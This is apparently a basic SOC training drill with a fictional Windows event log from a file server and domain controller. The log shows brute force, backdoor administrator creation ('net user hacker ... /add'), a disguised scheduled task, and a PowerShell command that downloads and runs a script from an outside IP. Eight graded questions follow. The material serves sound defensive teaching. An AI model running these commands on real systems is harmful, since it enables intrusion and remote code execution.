# Drill 01 (Basic): Windows Event Log Analysis

**Level:** Basic

**Estimated time:** 30 minutes

**Skills tested:** Windows Event ID identification, logon type analysis, brute force detection

---

## Scenario

You are a junior SOC analyst at a financial services company.
It is Monday morning, 08:15.
You have just started your shift and your SIEM has flagged a series of Windows Security events from the previous night on a server named `FILESERVER01.corp.local`.

Your task is to analyze the provided event log excerpt and answer the questions below.

---

## Evidence: Windows Security Event Log Excerpt

The following events occurred on `FILESERVER01.corp.local` between 02:00 and 02:15 on Sunday night.
Analyze them carefully.

```text
=== EVENT SET A ===

Event 1:
  Time:     2024-03-17 02:01:12 UTC
  EventID:  4625
  Computer: FILESERVER01.corp.local
  SubjectUserName: FILESERVER01$
  TargetUserName:  administrator
  LogonType:       3
  FailureReason:   %%2313  (Wrong password)
  Status:          0xC000006D
  SubStatus:       0xC000006A
  IpAddress:       192.168.50.201
  IpPort:          51022
  WorkstationName: -

Event 2:
  Time:     2024-03-17 02:01:14 UTC
  EventID:  4625
  Computer: FILESERVER01.corp.local
  TargetUserName:  administrator
  LogonType:       3
  FailureReason:   %%2313
  IpAddress:       192.168.50.201
  IpPort:          51023

Event 3:
  Time:     2024-03-17 02:01:16 UTC
  EventID:  4625
  Computer: FILESERVER01.corp.local
  TargetUserName:  administrator
  LogonType:       3
  FailureReason:   %%2313
  IpAddress:       192.168.50.201
  IpPort:          51024

[... Events 4 through 23 repeat the same pattern with IpPort incrementing ...]

Event 24:
  Time:     2024-03-17 02:03:47 UTC
  EventID:  4625
  Computer: FILESERVER01.corp.local
  TargetUserName:  administrator
  LogonType:       3
  FailureReason:   %%2313
  IpAddress:       192.168.50.201
  IpPort:          51045

Event 25:
  Time:     2024-03-17 02:03:51 UTC
  EventID:  4624
  Computer: FILESERVER01.corp.local
  TargetUserName:  administrator
  TargetDomainName: FILESERVER01
  LogonType:       3
  IpAddress:       192.168.50.201
  IpPort:          51046
  WorkstationName: -
  AuthenticationPackageName: NTLM
  LmPackageName: NTLM V1

=== EVENT SET B ===

Event 26:
  Time:     2024-03-17 02:04:15 UTC
  EventID:  4688
  Computer: FILESERVER01.corp.local
  SubjectUserName:   administrator
  NewProcessName:    C:\Windows\System32\cmd.exe
  CommandLine:       cmd.exe /c whoami && net user && net localgroup administrators
  ParentProcessName: C:\Windows\System32\svchost.exe
  TokenElevationType: %%1937

Event 27:
  Time:     2024-03-17 02:04:18 UTC
  EventID:  4688
  Computer: FILESERVER01.corp.local
  SubjectUserName:  administrator
  NewProcessName:   C:\Windows\System32\net.exe
  CommandLine:      net user hacker Password123! /add
  ParentProcessName: C:\Windows\System32\cmd.exe

Event 28:
  Time:     2024-03-17 02:04:19 UTC
  EventID:  4688
  Computer: FILESERVER01.corp.local
  SubjectUserName:  administrator
  NewProcessName:   C:\Windows\System32\net.exe
  CommandLine:      net localgroup administrators hacker /add
  ParentProcessName: C:\Windows\System32\cmd.exe

=== EVENT SET C ===

Event 29:
  Time:     2024-03-17 02:05:30 UTC
  EventID:  4698
  Computer: FILESERVER01.corp.local
  SubjectUserName: administrator
  TaskName:        \Microsoft\Windows\WindowsDefender\Scan
  TaskContent:     [XML excerpt]
    <Actions>
      <Exec>
        <Command>C:\ProgramData\Microsoft\scan.exe</Command>
        <Arguments>/q /s</Arguments>
      </Exec>
    </Actions>
    <Triggers>
      <BootTrigger><Enabled>true</Enabled></BootTrigger>
    </Triggers>
    <Principals>
      <RunLevel>HighestAvailable</RunLevel>
    </Principals>

=== EVENT SET D ===

Event 30:
  Time:     2024-03-17 02:08:42 UTC
  EventID:  4624
  Computer: DC01.corp.local        ← DIFFERENT COMPUTER
  TargetUserName:  administrator
  LogonType:       3
  IpAddress:       192.168.50.101  ← FILESERVER01's IP
  AuthenticationPackageName: NTLM
  LmPackageName: NTLM V1

Event 31:
  Time:     2024-03-17 02:09:01 UTC
  EventID:  4688
  Computer: DC01.corp.local
  SubjectUserName: administrator
  NewProcessName:  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  CommandLine:     powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://185.234.219.47/dc.ps1')"
```

---

## Questions

**Answer all questions in writing.
For each answer, cite the specific event number(s) that support your conclusion.**

---

### Q1 — Classification (2 points)

Classify the activity in Event Set A.
What type of attack is this?
What specific characteristics in the events led you to your conclusion?

---

### Q2 — Logon Type Analysis (2 points)

Event 25 shows a successful logon with `LogonType: 3` and `AuthenticationPackageName: NTLM`.

a) What does LogonType 3 mean?
b) Why is NTLM authentication concerning here instead of Kerberos?
c) What does `LmPackageName: NTLM V1` tell you about the security posture?

---

### Q3 — Post-Exploitation Analysis (3 points)

Analyze Events 26–28.
Answer:

a) What is the attacker doing in Event 26?
Why run `net user && net localgroup administrators`?
b) What did the attacker accomplish in Events 27 and 28?
c) What MITRE ATT&CK technique does this represent?

---

### Q4 — Persistence Mechanism (2 points)

Analyze Event 29 (scheduled task creation).

a) Identify THREE red flags in this scheduled task.
b) What MITRE ATT&CK technique does this represent?

---

### Q5 — Lateral Movement (3 points)

Analyze Events 30–31 (on DC01).

a) What does it mean that DC01 shows a successful logon from `192.168.50.101`?
What is `192.168.50.101`?
b) What is the attacker doing in Event 31?
c) Why is lateral movement to a Domain Controller particularly dangerous?

---

### Q6 — Timeline Construction (3 points)

Construct a numbered timeline of the attack, from first event to last.
For each step, include: time, what happened, and the MITRE ATT&CK technique.

---

### Q7 — Response Actions (3 points)

Based on your analysis, list the **immediate response actions** you would take.
Prioritize them (most urgent first) and explain why each is necessary.

---

### Q8 — Detection Gap (2 points)

This attack succeeded in its initial phase (brute force).
What detection could have alerted the SOC **earlier** — ideally before the attacker gained access?

---

## Submission Format

Write your answers in order (Q1 through Q8).
For each answer, cite the specific event numbers.
Where applicable, use MITRE ATT&CK technique IDs.

**See `solutions/drill-01-solution/README.md` for the complete answer key.**
